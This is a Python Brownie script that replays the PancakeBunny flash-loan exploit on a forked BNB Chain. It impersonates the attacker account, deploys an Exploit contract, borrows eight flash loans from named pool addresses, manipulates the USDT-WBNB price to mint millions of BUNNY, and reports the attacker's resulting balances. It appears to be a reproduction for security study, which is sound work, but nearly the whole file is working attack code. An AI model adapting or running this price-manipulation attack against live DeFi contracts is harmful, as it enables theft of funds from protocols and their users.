from brownie import *
import time

"""
1. Add 1 WBNB to the Bunny USDT-WBNB Vault
2. Borrow eight flashloans. Seven loans are from PancackeSwap and last from FortubeBank
3. Add some liqudity to USDT-WBNB pool on PancakeSwap while leaving LP tokens in this pool
4. Then he swapped 2.3M BNB to USDT through this pool
5. call getReward() to mint 7 million BUNNY using assets from the first step
6. Sold BUNNY
7. Repay flashloans

Main problem: Pancakebunny calculated the price of BNB in and unsecured way
"""
block = 7556329

attacker = accounts.at('0xa0ACC61547f6bd066f7c9663C17A312b6Ad7E187', force=True)
attacker_contract = Exploit.deploy({'from': attacker})
keeper = accounts.at('0x793074d9799dc3c6039f8056f1ba884a73462051', force=True)

WBNB = Contract.from_explorer('0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c')
BSC_USD = Contract.from_explorer('0x55d398326f99059fF775485246999027B3197955')
VaultFlipToFlip = Contract.from_explorer('0x633e538ecf0bee1a18c2edfe10c4da0d6e71e77b')

def main():
    # prepeare for flashloans
    # https://bscscan.com/tx/0x88fcffc3256faac76cde4bbd0df6ea3603b1438a5a0409b2e2b91e7c2ba3371a
    WBNB.transfer(attacker_contract.address, 1e18, {'from': attacker})

    attacker_contract.start({'from': attacker})

    # wait until keeper trigger harvest()
    # https://bscscan.com/tx/0x9c48fd13d65f5f951882282444a45a7b84c4f673891bbdcc48af68ed305950bb
    VaultFlipToFlip.harvest({'from': keeper})

    # then main attack goes on
    # https://bscscan.com/tx/0x897c2de73dd55d7701e1b69ffb3a17b0f4801ced88b0c75fe1551c5fcce6a979

    """
            Take eight flashloans
        First sevent from PancakePair
        0 - 0x0ed7e52944161450477ee417de9cd3a859b14fd0 WBNB+CAKE
        1 - 0x58f876857a02d6762e0101bb5c46a8c1ed44dc16 WBNB+BUSD
        2 - 0x74e4716e431f45807dcf19f284c7aa99f18a4fbc WBNB+ETH
        3 - 0x61eb789d75a95caa3ff50ed7e47b96c132fec082 WBNB+BTCB
        4 - 0x9adc6fb78cefa07e13e9294f150c1e8c1dd566c0 WBNB+SAFEMOON
        5 - 0xf3bc6fc080ffcc30d93df48bfa2aa14b869554bb WBNB+BELT
        6 - 0xdd5bad8f8b360d76d12fda230f8baf42fe0022cf WBNB+DOT

        eighth goes from FortubeBank 
        7 - 0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672
    """
    attacker_contract.main({'from': attacker})

    print('------------------------------------------------------')
    print('Balance after:\n',
    'WBNB', WBNB.balanceOf(attacker_contract.address), '\n',
    'BSC_USD', BSC_USD.balanceOf(attacker_contract.address))



